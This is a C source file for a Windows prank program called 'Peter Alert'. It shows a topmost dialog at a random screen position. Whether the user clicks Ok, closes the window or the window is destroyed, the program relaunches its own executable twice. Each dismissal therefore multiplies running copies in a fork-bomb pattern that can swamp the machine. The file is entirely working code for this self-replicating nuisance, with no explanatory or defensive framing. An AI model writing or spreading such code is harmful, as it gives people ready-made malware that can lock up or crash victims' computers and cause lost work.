#include <windows.h>
#include <wingdi.h>
#include <psapi.h>
#include <processthreadsapi.h>
#include <time.h>
#include <stdlib.h>
#include "resource.h"
#include <stdio.h>

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
LRESULT CALLBACK DialogProc(HWND, UINT, WPARAM, LPARAM);

void CreateDialogBox(HWND);
void RegisterDialogClass(HWND);

HINSTANCE ghInstance;
HICON g_hbmBall = NULL;

char filename[257] = "";

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  	srand(time(NULL));
  	MSG  msg;
    HWND hwnd;

    DWORD pid = GetCurrentProcessId();
    HANDLE hProcess2 = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    GetModuleFileNameA(NULL,(LPSTR)filename,257);

  	WNDCLASSEXW wc = {0};
  	wc.cbSize           = sizeof(WNDCLASSEXW);
  	wc.lpfnWndProc      = (WNDPROC) WndProc;
  	wc.hInstance        = hInstance;
  	wc.hbrBackground    = GetSysColorBrush(COLOR_3DFACE);
  	wc.lpszClassName    = L"DialogClass";
  	RegisterClassExW(&wc);
  
  	hwnd = CreateWindowExW(WS_EX_DLGMODALFRAME | WS_EX_TOPMOST,  L"DialogClass", L"Peter Alert", 
        WS_VISIBLE | WS_SYSMENU | WS_CAPTION , rand()%GetSystemMetrics(SM_CXFULLSCREEN), rand()%GetSystemMetrics(SM_CYFULLSCREEN), 200, 150,
        NULL, NULL, hInstance,  NULL);

  	ghInstance = hInstance;
    //hIcon1 = LoadIcon(ghInstance, MAKEINTRESOURCE(IC_PETER));
  	while( GetMessage(&msg, NULL, 0, 0)) {
    DispatchMessage(&msg);
  	}
  
  	return (int) msg.wParam;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {

  	switch(msg) {
  
   	case WM_CREATE:
        g_hbmBall = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IC_PETER),IMAGE_ICON,0,0,LR_DEFAULTSIZE);
        if(g_hbmBall == NULL)
          MessageBox(hwnd, "Could not load IC_PETER!", "Error", MB_OK | MB_ICONEXCLAMATION);
        CreateWindowW(L"button", L"Ok",
         WS_VISIBLE | WS_CHILD ,50, 50, 80, 25, hwnd, (HMENU) 1, NULL, NULL);
    break;

      case WM_COMMAND:
        WinExec(filename, SW_SHOW);
        if(WinExec(filename, SW_SHOW) <31)
        {
          MessageBox(NULL,"could not open program","error",MB_OK);
        }
        DeleteObject(g_hbmBall);
        PostQuitMessage(0);
      break;

      case WM_PAINT:
      {
        PAINTSTRUCT     ps;
        HDC             hdc;
        hdc = BeginPaint(hwnd,&ps);
        DrawIcon(hdc, 75, 10, g_hbmBall); 
        EndPaint(hwnd, &ps);
        break;
      }

      case WM_CLOSE:
        WinExec(filename, SW_SHOW);
        if(WinExec(filename, SW_SHOW) <31)
        {
          MessageBox(NULL,"could not open program","error",MB_OK);
        }
        DeleteObject(g_hbmBall);
        PostQuitMessage(0);
        break;

    case WM_DESTROY:
        WinExec(filename, SW_SHOW);
        if(WinExec(filename, SW_SHOW) <31)
        {
          MessageBox(NULL,"could not open program","error",MB_OK);
        }
        DeleteObject(g_hbmBall);
        PostQuitMessage(0);
    break;
  }
  return DefWindowProcW(hwnd, msg, wParam, lParam);
}